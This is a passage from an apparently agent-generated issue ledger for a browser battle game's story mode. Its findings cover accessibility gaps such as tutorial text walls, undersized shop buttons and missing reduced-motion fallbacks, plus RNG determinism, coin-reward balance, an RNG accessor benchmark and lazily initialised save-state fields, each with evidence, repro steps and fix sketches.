606      | MYSTERY_FIGURE_IDENTITIES    | 26426   | 28705
607      | _showIntroRivalColdOpen      | 33069   | 37866
```
The variant system is the most actively edited area of battle.html (CHANGELOG 2026-05-20: "12 sections all additive"), so line refs drift fastest here.

**Repro**: `node scripts/debug/spec-drift.mjs && sed -n '60,75p' tests/reports/spec-drift.md`.

**Blast radius**: This doc is the canonical guide for adding a 9th storyline variant; readers following its anchors land in wrong functions. STORY_BEATS / STORY_COLD_OPENS / STORYLINE_VARIANTS are the three keystone consts a variant author touches.

**Fix sketch**: Re-resolve via `find-anchor`, replace with symbol-only annotations. The six symbols here are stable in the index — re-link them and the doc is self-healing across future refactors.

**Verification**: `node scripts/debug/spec-drift.mjs` reports 0 drift entries under this doc.

---

## <a id="ISSUE-193"></a> ISSUE-193: Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance

---
id: ISSUE-193
severity: P3
category: dx
anchor_symbol: STORY_TUTORIAL_SCENES
current_line_hint: ~34785
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 92a8d59337aa
confidence: medium
status: open
---

**Title**: Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance

**Evidence**:
```js
// STORY_TUTORIAL_SCENES.firstTrainerBattle at ~34786
firstTrainerBattle: {
    metaKey: 'tutorial-first-trainer-battle',
    sprite: 'Oak', name: 'Prof. Oak', nameplate: 'Your First Fight',
    lines: [
        '"Two trainers, two teams, one road. That\'s a battle."',
        '"Tap ⚔ FIGHT to pick a move. Each one has its own PP, so the strongest hit isn\'t always the right one. Physical, Special, and Status all read off different stats — type matters more than raw level. Super-effective doubles your damage; the wrong type can half it."',
        '"🔴 POKÉMON swaps your active partner — it costs your turn, so use it on a read. 🎒 BAG burns an item. 🏃 RUN forfeits the fight and a slice of gold. Keep that HP bar green."'
    ]
}
```

Each tutorial dumps three multi-clause sentences in one frame with no per-line "Next" pacing — the player gets all 60-100 words at once and a single "Continue →" button. There's no voice/SFX channel, no incremental reveal, no "I've read this, don't show again" toggle (the dedupe is automatic via `tipsShown`, which is good, but means the player can't *intentionally* re-read a tutorial). For users who read slowly or use a screen reader, the text dump is announced as one block; SR users can't pause within it.

**Repro**: Trigger `firstTrainerBattle` — read it in <5s; nothing tracks reading progress.

**Blast radius**: 10+ first-time scenes. The tutorial is the single most important touchpoint for player retention; a text-wall here is also a missed opportunity to teach type matchups via demo animation.

**Fix sketch**: Convert `lines:` into a per-line reveal — render only the first line, advance on Continue/Tap. Add an SR-friendly `aria-live="polite"` announcement per line. Optionally: a "Re-show last tutorial" entry in Settings (the `tipsShown` flag is already keyed by `metaKey` so this is one-line). A subtle 8-bit "blip" SFX per line would also help engagement (already in use elsewhere for shop chimes — `StoryFx`).

**Verification**: Open a tutorial → only line 1 visible; Continue advances; final continue dismisses.

---

## <a id="ISSUE-194"></a> ISSUE-194: Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline

---
id: ISSUE-194
severity: P3
category: a11y
anchor_symbol: story-shop-buy-btn
current_line_hint: ~2267
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a93e15e90227
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline

**Evidence**:
```css
.story-shop-buy-btn {
    min-height:34px; padding:6px 14px; font-size:12px; …
}
/* mobile override at ~5667 */
@media (max-width: 480px) {
    .story-shop-buy-btn { min-height: 42px !important; padding: 8px 18px !important; … }
}
```

The Mart, Department Store, Artifact Shop, Tutor, Colress, Event Trainer, Fanclub buy buttons all share `.story-shop-buy-btn` — 34 px desktop, 42 px mobile. The 42 px is short of the WCAG 2.1 SC 2.5.5 (AAA) target-size 44×44 minimum and the more recent SC 2.5.8 (AA) 24×24 floor for "no spacing exemption". Adjacent rows make accidental taps likely. Compare to the battle command grid (60 px) and the modal-summary tabs (44 px) — both meet the bar.

**Repro**: Open Mart on a phone, tap "Buy" — possible to hit the adjacent item's button when scrolling.

**Blast radius**: Every shop. The mobile shop experience is a P2 surface (story mode is the polish target, and most run time outside battles is spent in shops).

**Fix sketch**: Bump the `@media (max-width: 480px)` override to `min-height: 44px`. Also widen the row gap from `10px` to `12px` so the spacing exemption applies.

**Verification**: DevTools mobile mode at 360px width → measure the buy button bounding box ≥ 44×44.

---

## <a id="ISSUE-195"></a> ISSUE-195: Tutorial overlay's four-stage entrance animation has no reduced-motion fallback

---
id: ISSUE-195
severity: P3
category: a11y
anchor_symbol: story-tutorial-overlay
current_line_hint: ~4256
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: dcc6311c0e55
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Tutorial overlay's four-stage entrance animation has no reduced-motion fallback

**Evidence**:
```css
.story-tutorial-overlay { …animation: storyTutorialOverlayIn 0.32s ease-out both; }
.story-tutorial-sprite  { …animation: storyTutorialSpriteIn 0.55s cubic-bezier(0.18,0.9,0.32,1.18) both; }
.story-tutorial-name    { …animation: storyTutorialNameIn 0.4s ease-out 0.25s both; }
.story-tutorial-dialog-host { …animation: storyTutorialDialogIn 0.5s ease-out 0.4s both; }
.story-tutorial-continue { animation: storyTutorialNameIn 0.4s ease-out 0.7s both; }
```

The tutorial cascade plays four staggered animations totaling ~1.1s before the Continue button is even visible (it animates in last at 0.7s delay). With `prefers-reduced-motion: reduce`, none of these collapse — Sprite scaling/translate, fade-in cascades, all play at full intensity. The existing line-58 reduced-motion block targets confetti / victory-badge / rotate-icon / hp-critical only.

**Repro**: Reduced motion on, trigger any first-time tutorial → sprite still bounces in, name slides down, dialog scales up, button fades in.

**Blast radius**: Pairs with the broader prefers-reduced-motion finding but is highlighted separately because tutorials are the load-bearing on-boarding moment.

**Fix sketch**: Add to existing line-58 block: `.story-tutorial-overlay, .story-tutorial-overlay * { animation: none !important; opacity: 1 !important; transform: none !important; }`. Or scope a fresh `@media (prefers-reduced-motion: reduce) { .story-tutorial-overlay { animation: none; } .story-tutorial-sprite, .story-tutorial-name, .story-tutorial-dialog-host, .story-tutorial-continue { animation: none; } }` block near line 4308.

**Verification**: With reduced motion on, all four elements render instantly when the overlay mounts.

---

## <a id="ISSUE-196"></a> ISSUE-196: Scope-leak audit (same class as fixed `sm` bug) — NEGATIVE: no other IIFE-internal symbol referenced bare from turn-loop scope

---
id: ISSUE-196
severity: P3
category: inconsistency
anchor_symbol: storyAwareRng
current_line_hint: ~13853
file: battle.html
agents: [battle-engine-debugger]
fingerprint: 2a0f0c7901bb
confidence: high
status: open
---

**Title**: Scope-leak audit (same class as fixed `sm` bug) — NEGATIVE: no other IIFE-internal symbol referenced bare from turn-loop scope

**Evidence**:
```text
# 864 IIFE-internal top-level decls (lines 28370-51840) extracted; each grepped for
# bare (non-window., non-typeof, non-declared) reference in lines <28370. Result:
# 0 call-form leaks, 0 token-form leaks. Only 2 hits, both inside an HTML <code> string at 8750.
# storyRngNext bare uses (33996,36623,37045,42955,42966,43263) are all >31724 (inside IIFE — in scope).
# makeBuild:10482 uses `typeof sm`/`typeof storyRngNext` guards (typeof never throws on undeclared) — safe.
# The global Math.random override at 31900 (routes to storyRngNext when sm.active && runSeed!=null)
# reads bare sm but is lexically inside the IIFE — in scope; guarded with typeof. Safe.
```

**Repro**: `awk` IIFE-symbol extraction + grep sweep over the pre-IIFE region (commands in session). No ReferenceError-class scope leak remains besides the already-fixed `sm` sites.

**Blast radius**: Confirms the lead's `storyAwareRng()` fix is comprehensive for the bare-`sm` turn-skip class. Filed for the ledger so future agents don't re-investigate.

**Fix sketch**: None needed. Recommend an ESLint `no-undef` pass scoped to the script-top region as a regression guard.

**Verification**: Re-run the symbol-leak sweep; expect 0 candidates.

---

## <a id="ISSUE-197"></a> ISSUE-197: `storyAwareRng()` helper exists but the combat engine still calls bare `Math.random()` at ~250 sites

---
id: ISSUE-197
severity: P3
category: dx
anchor_symbol: storyAwareRng
current_line_hint: ~13921
file: battle.html
agents: [consistency-auditor]
fingerprint: 597bc36d66fb
confidence: medium
status: open
---

**Title**: `storyAwareRng()` helper exists but the combat engine still calls bare `Math.random()` at ~250 sites

**Evidence**:
```js
// 13921 — the seeded-RNG selector, referenced only 13× total:
function storyAwareRng() {
    const s = (window.StoryMode && window.StoryMode.state) || null;
    return (s && s.active && typeof window.storyRngNext === 'function') ? window.storyRngNext : Math.random;
}
// 22032 / 22537 / 22961 / 23328-23346 / 25243 / 25447 — combat math is all bare:
let crit = (!armorBlocksCrit && Math.random() < critRate) ? … : 1;       // crit
let rng = 0.85 + (Math.random() * 0.15);                                   // damage spread
if (Math.random() * 100 > finalAcc) { break; }                            // accuracy
if (defender.ability === "Static" && Math.random() < 0.3) applyStatus(…); // secondary
```

**Repro**: `grep -c 'Math.random()' battle.html` → 269; `grep -c storyAwareRng` → 13. The per-turn combat rolls (crit, damage 0.85-1.0 spread, accuracy, secondary-effect/status chances, confusion, multi-hit) never route through the seeded RNG. NOTE: this is currently consistent with the determinism *contract* — story-replay.mjs snapshots roster/catch/progression state + `sm._strngState`, not per-turn HP, and its own comment defers turn-level replay to integration tests. So this is **not** a live replay-drift bug today (unlike the prior, now-fixed scope-leak P1s).

**Blast radius**: Forward-looking. REDESIGN_PLAN adds the Fight Club draft gauntlet (5 rounds, counter-pick AI) and leans on "tests behind a SAVE_VER bump." If turn-level deterministic replay is ever wanted for Fight Club regression/save-scum protection, the engine has no seam — `storyAwareRng()` is the intended seam but is unused in the hot path. Flagging now so the redesign decides the determinism scope deliberately rather than discovering 250 unrouted sites mid-implementation.

**Fix sketch**: Decide explicitly whether combat is in the determinism contract. If yes, thread `storyAwareRng()` (or a battle-local seeded rng captured at battle start) through the damage/accuracy/secondary rolls and extend story-replay.mjs to snapshot turn outcomes. If no, document the boundary in a comment at storyAwareRng so future readers don't assume combat is seeded.

**Verification**: Either (a) replaying a seeded story battle twice yields identical HP traces, or (b) a comment at `storyAwareRng()` states combat RNG is intentionally non-deterministic and lists what IS seeded.

---

## <a id="ISSUE-198"></a> ISSUE-198: Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile

---
id: ISSUE-198
severity: P3
category: a11y
anchor_symbol: storyCatchMasterPulse
current_line_hint: ~1908
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 679f436786d4
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile

**Evidence**:
```css
.story-catch-ball--master {
    box-shadow: 0 0 14px rgba(206, 147, 216, 0.55), inset 0 0 14px rgba(206, 147, 216, 0.18) !important;
    animation: storyCatchMasterPulse 2.2s ease-in-out infinite;
}
@keyframes storyCatchMasterPulse {
    0%, 100% { box-shadow: 0 0 14px rgba(206, 147, 216, 0.55), inset 0 0 14px rgba(206, 147, 216, 0.18); }
    50%      { box-shadow: 0 0 22px rgba(206, 147, 216, 0.85), inset 0 0 18px rgba(206, 147, 216, 0.32); }
}
```

Contrast itself is fine: `#ce93d8` text on `rgba(20,28,40,0.6)` over a dark battle background gives ~7:1, passes WCAG AA. The accessibility issue is that the pulse is `infinite` with no `prefers-reduced-motion` carve-out. The catch screen typically holds the player's attention for 30-90 s while they read flee/catch percentages — that's ≥15 pulses of an eye-catching glow loop.

**Repro**: With reduced motion enabled (macOS / Windows / Firefox flag), open any wild encounter where you hold ≥1 Master Ball → button still pulses every 2.2s.

**Blast radius**: Vestibular / photosensitivity-sensitive users. Pairs with the broader reduced-motion finding.

**Fix sketch**: Inside an existing `prefers-reduced-motion` block (or a new one): `.story-catch-ball--master { animation: none !important; }`. Keep the static box-shadow so the affordance ("this ball is special") still reads.

**Verification**: Open catch screen with reduced motion → glow holds static.

---

## <a id="ISSUE-199"></a> ISSUE-199: CONFIRMED FIXED — Hard coin mult floored to 1.00 (prior audit 2.1); Challenge 1.10

---
id: ISSUE-199
severity: P3
category: balance
anchor_symbol: storyDifficultyCoinMult
current_line_hint: ~29142
file: battle.html
agents: [story-mode-investigator]
fingerprint: 2f91ba9853c9
confidence: high
status: open
---

**Title**: CONFIRMED FIXED — Hard coin mult floored to 1.00 (prior audit 2.1); Challenge 1.10

**Evidence**:
```js
if (diff === 'hard') return 1.00;       // was 0.92 — "floored at parity so the coin curve stops fighting the difficulty curve"
if (diff === 'challenge') return 1.10;
```

**Repro**: Prior audit 2.1 flagged Hard paying ×0.92 (punishing the hardest stretch). `storyDifficultyCoinMult` (29137) now returns 1.00 for Hard, 1.10 Challenge, 1.30 Normal, 1.50 Easy, 1.60 VeryEasy. Hardcore removed entirely. Resolved.

**Blast radius**: Tier-2 #14 — resolved. (Note: STORY_MODE_FLOW §8 coin table still lists "Normal 1.30 / Hard 1.00 (floored from 0.92)" — matches code.)

**Fix sketch**: None — confirmation.

**Verification**: Win a Hard fight; coin payout ≥ parity.

---

## <a id="ISSUE-200"></a> ISSUE-200: Hard mode still earns less gold per fight than Normal (1.00 vs 1.30) despite facing 1.15x-stronger foes — residual difficulty/economy asymmetry

---
id: ISSUE-200
severity: P3
category: balance
anchor_symbol: storyDifficultyCoinMult
current_line_hint: ~29385
file: battle.html
agents: [story-mode-investigator]
fingerprint: 8b9a943876e8
confidence: low
status: open
---

**Title**: Hard mode still earns less gold per fight than Normal (1.00 vs 1.30) despite facing 1.15x-stronger foes — residual difficulty/economy asymmetry

**Evidence**: The prior-audit "Hard pays x0.92" was fixed — `storyDifficultyCoinMult()` now floors Hard at parity (1.00) and Challenge at 1.10:
```js
if (diff === 'normal') return 1.30;
if (diff === 'hard')   return 1.00;   // "floored at parity"
if (diff === 'challenge') return 1.10;
```
But Normal still pays 1.30 while Hard pays 1.00, so a Hard player earns ~77% of Normal's gold rate. Meanwhile `applyFoeDifficultyScaling` gives Hard foes 1.15x stats (Challenge 1.30x) and Hard/Challenge also get extra bench Revives (~49210) — i.e. harder, longer fights for less income. This is an intentional design choice (the comment says so), so flagging as low-confidence.

**Repro**: Inspect `storyDifficultyCoinMult` (~29385) vs `applyFoeDifficultyScaling` (~14085).

**Blast radius**: Story economy on Hard/Challenge. Tighter gold means fewer shop heals / tutor rerolls during the hardest stretch — may compound the difficulty rather than purely rewarding it.

**Fix sketch**: Consider raising Hard to ~1.15-1.30 (reward proportional to foe-stat bump) if the intent is "harder = more loot," or leave as-is if "harder = scarcer economy" is the deliberate stance. Documented decision either way.

**Verification**: Playtest gold trajectory on Hard vs Normal across the front half; confirm the intended relative economy.

---

## <a id="ISSUE-201"></a> ISSUE-201: `storyRngNext` / per-engine-entry `rng` ternary accessor is **0.0003 ms (300 ns) per call** — no closure allocation penalty, accessor pattern is clean

---
id: ISSUE-201
severity: P3
category: perf
anchor_symbol: storyRngNext
current_line_hint: ~34916
file: battle.html
agents: [performance-profiler]
fingerprint: b4751b0d02de
confidence: high
status: open
---

**Title**: `storyRngNext` / per-engine-entry `rng` ternary accessor is **0.0003 ms (300 ns) per call** — no closure allocation penalty, accessor pattern is clean

**Evidence**: Mandate item #10 — "confirm no per-call closure allocation" — for the recent fix that added a per-engine-entry RNG accessor like `const rng = (sm && sm.active && typeof window.storyRngNext === 'function') ? window.storyRngNext : Math.random;`. The function reference is hoisted once per call site (not per RNG draw), and `window.storyRngNext` is a function value lookup, not a closure capture.

**Repro**: 10,000 invocations of `window.storyRngNext ? window.storyRngNext() : Math.random()` directly: median **0.325 μs, p95 0.392 μs, max 100.9 μs (single outlier from GC pause)** (`/tmp/deep-perf.mjs` 2026-05-28). The outlier is harness noise (process-wide GC), not a per-call cost.

**Blast radius**: `parseMoveEffects` median is 18 μs, of which the ~10–15 RNG calls cost a combined ~5 μs — RNG itself is <30% of the per-move cost, and the accessor wrap is in the noise. This rules out the accessor pattern as a perf concern.

**Fix sketch**: No fix needed. Confirmed clean.

**Verification**: Re-check if `parseMoveEffects` per-move median rises above 0.05 ms — that would indicate something else regressed, not this accessor.

---

## <a id="ISSUE-202"></a> ISSUE-202: Status indicator toggles role="status" + aria-label onto a <div> at content-mutation time

---
id: ISSUE-202
severity: P3
category: a11y
anchor_symbol: updateUI
current_line_hint: ~16809
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: a17922c15f4a
confidence: medium
status: open
---

**Title**: Status indicator toggles role="status" + aria-label onto a <div> at content-mutation time

**Evidence**:
```js
statBox.innerText = mon.status || '';        // content changes first
if (mon.status) { statBox.setAttribute('aria-label', _statusAriaLabel(mon.status));
                  statBox.setAttribute('role', 'status'); }   // role added same tick
else { statBox.removeAttribute('aria-label'); statBox.removeAttribute('role'); }
```

**Repro**: Live regions must exist before their content mutates to announce reliably; here the `role="status"` is added to `#player-status`/`#foe-status` in the same frame the text is written (and removed when cleared), so AT may not announce the status change. `aria-label` on a non-focusable generic `<div>` is also weakly supported and can be ignored. (Battle-log narration of status via `logMsg` partly compensates.)

**Blast radius**: Player + foe status pills every turn a status is applied/cured (BRN/PSN/TOX/PAR/SLP/FRZ).

**Fix sketch**: Put a permanent `role="status"` (or `aria-live="polite"`) wrapper in the static markup and only mutate its text; drop the per-update role toggle. Prefer visible text + the existing `_statusAriaLabel` mapping over `aria-label` on the div.

**Verification**: SR announces "Burned"/"Paralyzed" etc. on the turn the status lands, without the role being toggled.

---

## <a id="ISSUE-203"></a> ISSUE-203: `sm.wildSeenByEventIdx` and `sm.staticDrops` are lazily initialized instead of declared in the `sm` defaults block

---
id: ISSUE-203
severity: P3
category: dx
anchor_symbol: wildSeenByEventIdx
current_line_hint: ~39699
file: battle.html
agents: [story-mode-investigator]
fingerprint: d7124798a455
confidence: medium
status: open
---

**Title**: `sm.wildSeenByEventIdx` and `sm.staticDrops` are lazily initialized instead of declared in the `sm` defaults block

**Evidence**:
```js
// battle.html ~30654   sm defaults block
let sm = { active:false, eventIndex:0, badges:0, gold:2000, casinoStats:{}, team:[], ... };
// (no wildSeenByEventIdx, no staticDrops in the literal)

// battle.html ~39699   lazy init
function _markWildSeen(battleIdx, delta) {
    if (!sm.wildSeenByEventIdx || typeof sm.wildSeenByEventIdx !== 'object') sm.wildSeenByEventIdx = {};
    ...
}

// battle.html ~38199   lazy init
if (!sm.staticDrops || typeof sm.staticDrops !== 'object') sm.staticDrops = {};

// battle.html ~38535   lazy init
if (!sm.staticDrops) sm.staticDrops = {};
```
Most save fields are declared in the `sm` literal (~30654) and `newStoryRun` (~33660). These three are not, which makes "what state does a fresh run actually have?" harder to reason about.

**Repro**: `JSON.stringify(sm)` on a brand-new run will have `pcBox` / `balls` / `pokedex` etc. but no `wildSeenByEventIdx` / `staticDrops` / `bossArc`. They get added incrementally as gameplay touches them.

**Blast radius**: DX only. Schema is shaped by code-flow rather than by data definition.

**Fix sketch**: Add `wildSeenByEventIdx: {}, staticDrops: {}, bossArc: null` to both the `sm` literal at ~30654 and the newStoryRun block at ~33660. The lazy-init guards can stay as defensive checks but become no-ops on new runs.

**Verification**: After fix, a fresh run's `Object.keys(sm)` shows the full schema up-front; no field appears mid-run.

---
